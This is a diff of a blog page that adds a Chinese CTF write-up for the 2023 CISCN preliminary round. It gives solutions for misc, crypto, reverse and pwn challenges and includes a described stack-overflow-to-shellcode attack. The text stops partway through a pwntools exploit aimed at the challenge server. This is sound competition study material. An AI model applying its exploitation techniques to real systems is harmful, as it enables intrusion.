@@ -163,7 +163,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -197,6 +197,206 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://r30blogs.com/2023/06/05/2023CISCN%E5%88%9D%E8%B5%9B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="nnnpc、commit、Eureka">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R3ape1团队笔记">
+      <meta itemprop="description" content="网络信息安全，责任重大，使命光荣。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | R3ape1团队笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/06/05/2023CISCN%E5%88%9D%E8%B5%9B/" class="post-title-link" itemprop="url">2023CISCN初赛</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-06-05 20:13:00 / 修改时间：20:16:12" itemprop="dateCreated datePublished" datetime="2023-06-05T20:13:00+08:00">2023-06-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="一、战队信息"><a href="#一、战队信息" class="headerlink" title="一、战队信息"></a>一、战队信息</h1><p>战队名称：R3ape1</p>
+<p>战队排名：171</p>
+<h1 id="二、解题情况"><a href="#二、解题情况" class="headerlink" title="二、解题情况"></a>二、解题情况</h1><p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image002.gif" alt="图片"></p>
+<h1 id="三、解题过程"><a href="#三、解题过程" class="headerlink" title="三、解题过程"></a>三、解题过程</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到卡"><a href="#签到卡" class="headerlink" title="签到卡"></a>签到卡</h3><p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image004.gif" alt="图片"></p>
+<p>根据提示可以知道穿孔卡片机里面执行的是python脚本，那就直接用python语句来读取flag就行</p>
+<p>print(open(‘&#x2F;flag’).read())</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image006.gif" alt="图片"></p>
+<p>得到flag，<strong>flag{3b78ec89-8a1c-424d-a9eb-97d63648846e}</strong></p>
+<p>被加密的生产流量</p>
+<p>打开流量包发现是modbus协议，还查找了许多资料，但其实flag直接追踪tcp流就可</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image008.gif" alt="图片"></p>
+<p>在0流获取base32编码拼接，解码得到flag</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image010.gif" alt="图片"></p>
+<p><strong>flag{c1f_fi1g_1000}</strong></p>
+<h3 id="国粹"><a href="#国粹" class="headerlink" title="国粹"></a>国粹</h3><p>附件得到三张图片</p>
+<p>其中题目.png作为每一块麻将所代表的数字，按顺序标记一下</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image012.gif" alt="图片"></p>
+<p>a.png和k.png分别作为横纵坐标，用python脚本打点画一个坐标图</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image014.gif" alt="图片"></p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image016.gif" alt="图片"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line">x = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">9</span>,<span class="number">9</span>,<span class="number">9</span>,<span class="number">9</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">12</span>,<span class="number">12</span>,<span class="number">12</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">14</span>,<span class="number">14</span>,<span class="number">14</span>,<span class="number">14</span>,<span class="number">14</span>,<span class="number">14</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">15</span>,<span class="number">15</span>,<span class="number">15</span>,<span class="number">15</span>,<span class="number">15</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">16</span>,<span class="number">16</span>,<span class="number">16</span>,<span class="number">16</span>,<span class="number">16</span>,<span class="number">16</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">18</span>,<span class="number">18</span>,<span class="number">18</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">22</span>,<span class="number">22</span>,<span class="number">22</span>,<span class="number">22</span>,<span class="number">22</span>,<span class="number">22</span>,<span class="number">22</span>,<span class="number">22</span>,<span class="number">22</span>,<span class="number">22</span>,<span class="number">22</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">24</span>,<span class="number">24</span>,<span class="number">24</span>,<span class="number">24</span>,<span class="number">24</span>,<span class="number">24</span>,<span class="number">24</span>,<span class="number">24</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">25</span>,<span class="number">25</span>,<span class="number">25</span>,<span class="number">25</span>,<span class="number">25</span>,<span class="number">25</span>,<span class="number">25</span>,<span class="number">25</span>,<span class="number">25</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">26</span>,<span class="number">26</span>,<span class="number">26</span>,<span class="number">26</span>,<span class="number">26</span>,<span class="number">26</span>,<span class="number">26</span>,<span class="number">26</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">27</span>,<span class="number">27</span>,<span class="number">27</span>,<span class="number">27</span>,<span class="number">27</span>,<span class="number">27</span>,<span class="number">27</span>,<span class="number">27</span>,<span class="number">27</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">29</span>,<span class="number">29</span>,<span class="number">29</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">33</span>,<span class="number">33</span>,<span class="number">33</span>,<span class="number">33</span>,<span class="number">33</span>,<span class="number">33</span>,<span class="number">33</span>,<span class="number">33</span>,<span class="number">33</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">34</span>,<span class="number">34</span>,<span class="number">34</span>,<span class="number">34</span>,<span class="number">34</span>,<span class="number">34</span>,<span class="number">34</span>,<span class="number">34</span>,<span class="number">35</span>,<span class="number">35</span>,<span class="number">35</span>,<span class="number">35</span>,<span class="number">35</span>,<span class="number">35</span>,<span class="number">35</span>,<span class="number">35</span>,<span class="number">35</span>,<span class="number">35</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">36</span>,<span class="number">36</span>,<span class="number">36</span>,<span class="number">36</span>,<span class="number">36</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">37</span>,<span class="number">37</span>,<span class="number">37</span>,<span class="number">37</span>,<span class="number">37</span>,<span class="number">37</span>,<span class="number">37</span>,<span class="number">37</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">39</span>,<span class="number">39</span>,<span class="number">39</span>]</span><br><span class="line"></span><br><span class="line">y = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">16.17</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">18</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">25</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">25</span>,<span class="number">29</span>,<span class="number">34</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">25</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">22</span>,<span class="number">24</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">18</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">16</span>,<span class="number">25</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">16</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">16</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">16</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">25</span>,<span class="number">31</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">32</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">26</span>,<span class="number">32</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">26</span>,<span class="number">32</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">33</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">26</span>,<span class="number">32</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">13</span>,<span class="number">16</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">32</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">31</span>]</span><br><span class="line"></span><br><span class="line">plt.plot(x, y, <span class="string">&#x27;rH&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image018.jpg" alt="图片"></p>
+<p>得到flag，<strong>flag{202305012359}</strong></p>
+<h3 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell"></a>pyshell</h3><p>这题思路比较简单，只是读取文件，但是一开始尝试的时候发现os，commands，subprocess，shlex和popen这些模块直接import的时候全部都被禁用了</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image020.gif" alt="图片"></p>
+<p>这题需要用拼接字符的方法去形成python语句来进行命令执行，而且一行有七个字符的限制</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image022.gif" alt="图片"></p>
+<p>拼接语句并执行</p>
+<p>得到flag，<strong>flag{6e363201-df3c-4957-9842-e0f79740a8df}</strong></p>
+<p>问卷</p>
+<p>填写问卷得到flag</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image024.jpg" alt="图片"></p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>基于国密SM2算法的密钥密文分发</p>
+<p>跟着题目给的文档进行复现</p>
+<p>首先先在线网站生成自己的private_keyA和public_keyA</p>
+<p><a target="_blank" rel="noopener" href="https://const.net.cn/tool/sm2/genkey/">https://const.net.cn/tool/sm2/genkey/</a></p>
+<p><img src="C:/Users/16956/AppData/Local/Temp/msohtmlclip1/01/clip_image026.gif" alt="图片"></p>
+<p>再将个人信息发送到&#x2F;api&#x2F;login获取选手id（汉字需要进行url编码）</p>
+<p><img src="C:/Users/16956/AppData/Local/Temp/msohtmlclip1/01/clip_image028.jpg" alt="图片"></p>
+<p>再用获取到的id和刚才生成的public_keyA发送到&#x2F;api&#x2F;allkey获取public_keyB和private_keyB</p>
+<p><img src="C:/Users/16956/AppData/Local/Temp/msohtmlclip1/01/clip_image030.jpg" alt="图片"></p>
+<p>在&#x2F;api&#x2F;quantum获取quantumString</p>
+<p><img src="C:/Users/16956/AppData/Local/Temp/msohtmlclip1/01/clip_image032.jpg" alt="图片"></p>
+<p>接着以为就是要进行sm2和sm4解密了，但可以直接&#x2F;api&#x2F;search获取解密之后的quantumString</p>
+<p><img src="C:/Users/16956/AppData/Local/Temp/msohtmlclip1/01/clip_image034.jpg" alt="图片"></p>
+<p>再用该string进行check</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image036.jpg" alt="图片"></p>
+<p>接着再次search就可以获得flag了</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image038.jpg" alt="图片"></p>
+<p><strong>flag{3e619f88-5b3c-4be2-8c9a-94067afa2a5e}</strong></p>
+<h3 id="Sign-in-passwd"><a href="#Sign-in-passwd" class="headerlink" title="Sign_in_passwd"></a>Sign_in_passwd</h3><p>拿到flag附件打开</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image040.jpg" alt="图片"></p>
+<p>是个替换码表的base64解密</p>
+<p>第二行urldecode得到base64码表</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image042.jpg" alt="图片"></p>
+<p>将第一行的密文进行base64换表解码</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image044.gif" alt="图片"></p>
+<p>得到<strong>flag{8e4b2888-6148-4003-b725-3ff0d93a6ee4}</strong></p>
+<h3 id="可信度量"><a href="#可信度量" class="headerlink" title="可信度量"></a>可信度量</h3><p>非预期出了ssh连上以后执行命令</p>
+<p>grep -ra “flag{“ &#x2F; 2&gt;&#x2F;dev&#x2F;null</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image046.gif" alt="图片"></p>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="ezbyte"><a href="#ezbyte" class="headerlink" title="ezbyte"></a>ezbyte</h3><p><strong>参考文章</strong><a target="_blank" rel="noopener" href="http://43.138.162.163:8090/archives/2022-dsctfchu-sai-nothing-writeup%E5%92%8Chttps:/richar.top/nothingchu-ti-si-lu-ji-wp/">http://43.138.162.163:8090/archives/2022-dsctfchu-sai-nothing-writeup和https://richar.top/nothingchu-ti-si-lu-ji-wp/</a></p>
+<p><strong>根据题目可知这道题大概是考察DWARF字节码，readelf -Wwf 可以查看DWARF字节码</strong></p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image048.gif" alt="图片"></p>
+<p>字节码很长但是我们只要看其中的r12表达式</p>
+<p>先看ida</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image050.gif" alt="图片"></p>
+<p>首先要进入到yes需要r13与r12相等，而xor r13，r13把r13清零了，所以只要r12等于0就行了</p>
+<p>再根据之前的字节码分析得出</p>
+<p><code>((a3 + 1512312) ^ 0x2D393663614447B1)+ ((a1 + 1892739) ^ 0x35626665394D17E8)+ ((a2 + 8971237) ^ 0x65342D6530C04912) + ((a4 + 9123704) ^ 0x6336396431BE9AD9)=0</code>成立就行</p>
+<p>写出exp</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image052.gif" alt="图片"></p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image054.gif" alt="图片"></p>
+<p>在拼接上上面的字符</p>
+<p><strong>flag{e609efb5-e70e-4e94-ac69-ac31d96c3861}</strong></p>
+<h3 id="babyRE"><a href="#babyRE" class="headerlink" title="babyRE"></a>babyRE</h3><p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image056.gif" alt="图片"></p>
+<p>看见这个flag，估计是假的，后面有串list，发现第一个是102就是字符“f“，可是第二个10并不是字符”l“，尝试把102^10，发现就是字符”l“，所以就是list[i]^list[i+1],解出来就是上面的假flag</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image058.jpg" alt="图片"></p>
+<p>第一行发现是一种Snap的语言，进入官网运行这个文件</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image060.gif" alt="图片"></p>
+<p>发现flag的逻辑</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image062.gif" alt="图片"></p>
+<p>根据代码分析</p>
+<p>exp</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image064.gif" alt="图片"></p>
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="烧烤摊儿"><a href="#烧烤摊儿" class="headerlink" title="烧烤摊儿"></a>烧烤摊儿</h3><p>购买啤酒功能没有对数量进行负数检查，所以可以用负数来绕过，从而进入gaming函数。gaming函数存在栈溢出，而且程序是静态链接，所以调用mprotect修改内存上的可执行权限，然后写shellcode并执行，从而getshell。</p>
+<p><strong>EXP</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io = remote(<span class="string">&#x27;39.106.71.184&#x27;</span>,<span class="number">34447</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">sd    = <span class="keyword">lambda</span> data        :io.send(data) </span><br><span class="line">sa    = <span class="keyword">lambda</span> delim,data     :io.sendafter(delim, data)</span><br><span class="line">sl    = <span class="keyword">lambda</span> data        :io.sendline(data)</span><br><span class="line">sla   = <span class="keyword">lambda</span> delim,data     :io.sendlineafter(delim, data)</span><br><span class="line">sda   = <span class="keyword">lambda</span> delim,data     :io.sendafter(delim, data)</span><br><span class="line">rcn   = <span class="keyword">lambda</span> numb=<span class="number">4096</span>      :io.recv(numb, timeout = <span class="number">3</span>)</span><br><span class="line">rl    = <span class="keyword">lambda</span>           :io.recvline()</span><br><span class="line">ru    = <span class="keyword">lambda</span> delims       :io.recvuntil(delims)</span><br><span class="line">uu32   = <span class="keyword">lambda</span> data        :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64   = <span class="keyword">lambda</span> data        :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">li    = <span class="keyword">lambda</span> tag, addr      :log.info(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">ls    = <span class="keyword">lambda</span> tag, addr      :log.success(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">lsh   = <span class="keyword">lambda</span> tag, addr      